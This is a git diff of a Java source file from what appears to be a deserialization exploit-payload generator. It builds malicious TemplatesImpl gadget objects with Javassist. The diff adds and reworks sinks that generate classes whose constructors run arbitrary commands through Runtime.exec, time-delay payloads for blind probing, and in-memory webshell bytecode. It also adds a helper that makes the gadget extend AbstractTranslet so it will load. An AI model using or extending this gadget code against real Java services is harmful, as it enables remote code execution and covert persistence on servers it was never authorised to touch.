@@ -1,7 +1,8 @@
 package com.ppp.sinks;
 
-import com.ppp.MemShellHelper;
-import com.ppp.MemShellScheduler;
+import com.ppp.JavaClassHelper;
+import com.ppp.JavaClassScheduler;
+import com.ppp.scheduler.MemShellScheduler;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.ClassFiles;
@@ -10,10 +11,7 @@ import com.ppp.utils.Reflections;
 import com.ppp.utils.maker.JavaClassUtils;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.CtConstructor;
-import javassist.CtField;
+import javassist.*;
 
 /**
  * @author Whoopsunix
@@ -22,17 +20,20 @@ import javassist.CtField;
 public class TemplatesImpl {
     /**
      * 命令执行
+     *
      * @param sinksHelper
      * @return
      * @throws Exception
      */
     @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
     public Object runtime(SinksHelper sinksHelper) throws Exception {
+        String className = "RuntimeD";
+
         String command = sinksHelper.getCommand();
 
         ClassPool pool = ClassPool.getDefault();
 
-        CtClass ctClass = pool.makeClass("RuntimeDemo");
+        CtClass ctClass = pool.makeClass(className);
         CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
         ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
         ctClass.addConstructor(ctConstructor);
@@ -42,40 +43,86 @@ public class TemplatesImpl {
         ctClass.defrost();
         ctClass.addField(CtField.make("private static final long SerialVersionUIDDemo = 8207363842866235160L;", ctClass));
 
-//        // 父类是否继承 AbstractTranslet
-//        if (false) {
-//            // todo 目前只针对没有父类的情况进行添加 所以不开放此功能
-//            CtClass AbstractTransletClass = pool.get(abstTranslet.getName());
-//            ctClass.defrost();
-//            ctClass.setSuperclass(AbstractTransletClass);
-//        }
+        // 是否继承 AbstractTranslet
+        extendsAbstractTranslet(ctClass, sinksHelper);
 
-        byte[] classBytes = ctClass.toBytecode();
-//        return JavaClassUtils.ctClassScheduler(ctClass, null, payloadOptions);
-        Object templatesImpl = createTemplatesImpl(classBytes);
+
+        Object templatesImpl = createTemplatesImpl(ctClass.toBytecode());
         return templatesImpl;
     }
 
 
+    /**
+     * 线程延时
+     *
+     * @param sinksHelper
+     * @return
+     * @throws Exception
+     */
+    @EnchantType({EnchantType.Sleep})
+    public Object sleep(SinksHelper sinksHelper) throws Exception {
+        String className = "SleepD";
+
+        Long sleepTime = sinksHelper.getSleepTime();
+        String sleep = sinksHelper.getSleep();
+
+        String code;
+        ClassPool pool = ClassPool.getDefault();
+        if (sleep != null && sleep.equalsIgnoreCase("timeunit")) {
+            sleepTime *= 1000L;
+            code = "java.lang.Thread.sleep((long)" + sleepTime + ");";
+        } else {
+            code = "java.util.concurrent.TimeUnit.SECONDS.sleep((long)" + sleepTime + ");";
+        }
+        CtClass ctClass = pool.makeClass(className);
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+        ctConstructor.setBody(code);
+        ctClass.addConstructor(ctConstructor);
+
+
+        // 是否继承 AbstractTranslet
+        extendsAbstractTranslet(ctClass, sinksHelper);
+
+//        new BASE64Encoder().encode(ctClass.toBytecode());
+        Object templatesImpl = createTemplatesImpl(ctClass.toBytecode());
+        return templatesImpl;
+    }
 
 
     /**
      * 内存马
+     *
      * @param sinksHelper
      * @return
      * @throws Exception
      */
     @EnchantType({EnchantType.MEMSHELL})
     public Object memShell(SinksHelper sinksHelper) throws Exception {
-        MemShellHelper memShellHelper = sinksHelper.getMemShellHelper();
+        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
 
-        byte[] classBytes = MemShellScheduler.build(memShellHelper);
+        byte[] classBytes = JavaClassScheduler.build(javaClassHelper);
 
         Object templatesImpl = createTemplatesImpl(classBytes);
         return templatesImpl;
     }
 
 
+    /**
+     * 是否继承 AbstractTranslet
+     *
+     * @param ctClass
+     * @param sinksHelper
+     * @throws Exception
+     */
+    public static void extendsAbstractTranslet(CtClass ctClass, SinksHelper sinksHelper) throws Exception {
+        if (!sinksHelper.isExtendsAbstractTranslet()) {
+            return;
+        }
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
+        ctClass.setSuperclass(superCtClass);
+    }
 
 
     public static Object createTemplatesImpl(final byte[] classBytes) throws Exception {
